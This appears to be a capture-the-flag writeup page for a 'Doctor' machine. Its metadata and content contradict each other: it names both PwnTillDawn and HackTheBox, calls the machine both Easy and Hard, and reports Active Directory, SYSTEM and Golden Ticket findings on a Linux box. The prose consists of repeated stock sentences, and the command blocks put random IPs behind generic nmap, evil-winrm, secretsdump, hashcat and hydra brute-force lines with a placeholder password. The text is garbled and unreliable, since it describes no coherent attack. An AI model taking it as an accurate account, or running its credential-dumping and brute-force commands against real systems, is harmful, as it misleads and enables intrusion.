---
TitleSEO: "PwnTillDawn — Doctor (Easy Linux) | ZureFX"
TitlePost: "PwnTillDawn — Doctor (Easy Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Doctor. NTLM Relay and Path Traversal to achieve easy compromise on Linux."
Keywords: "linux, hard, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-doctor-919.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-doctor-919/"
Date: "2024-12-30"
Tags: "Linux, Hard, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-doctor-919"
Permalink: "/writeups/htb-doctor-919.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Doctor** is rated **Easy** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.40.44.34`.

### Objectives

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p8443,8080,139 10.124.106.206 -oN scan.txt
feroxbuster -h
crackmapexec smb 10.34.70.8 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.49.30.66 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
nmap -sCV -p8888,3268,8888 10.77.193.5 -oN scan.txt
gobuster dir -u http://10.104.118.195/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.19.58.41 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

Key finding: **Path Traversal**.

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

```bash
nmap -sCV -p389,1433,445 10.15.190.15 -oN scan.txt
evil-winrm -i 10.72.212.11 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.215.211
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

```bash
feroxbuster -h
crackmapexec smb 10.17.86.195 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.123.42 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.78.165.132/FUZZ
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `nikto`
- `john`
- `feroxbuster`
- `kerbrute`
- `mimikatz`
- `pwncat`

### Key Takeaways

- NTLM Relay
- Path Traversal
- Golden Ticket
- Pass the Hash
